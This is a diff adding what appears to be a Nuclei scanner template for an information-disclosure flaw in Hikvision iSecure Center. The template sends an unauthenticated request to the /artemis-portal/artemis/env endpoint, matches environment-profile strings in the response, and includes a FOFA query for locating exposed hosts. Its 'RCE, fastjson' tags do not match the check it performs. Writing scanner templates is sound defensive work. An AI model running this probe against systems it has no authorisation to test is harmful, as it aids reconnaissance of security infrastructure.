@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - '{"profiles":["prod"]'
+            - ENV=non-prod
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /artemis-portal/artemis/env HTTP/1.1
+          Host: {{Hostname}}
+id: hikvision-env-Information-disclosure
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/portal/skin/isee/redblack/"
+        综合安防管理平台 iSecure Center /artemis-portal/artemis/env存在信息泄露
+    name: 综合安防管理平台 iSecure Center /artemis-portal/artemis/env 信息泄露
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247483767&idx=1&sn=3db533fc9cced127763272b6f69b717c&chksm=c267b444f5103d521eea0143c864a2bc8b5b9856eafe9c400b7227baab8440a3aa7acfdb1ac8&token=1439003696&lang=zh_CN#rd
+    severity: medium
+    tags:
+        - RCE，fastjson
+        - Fastjson
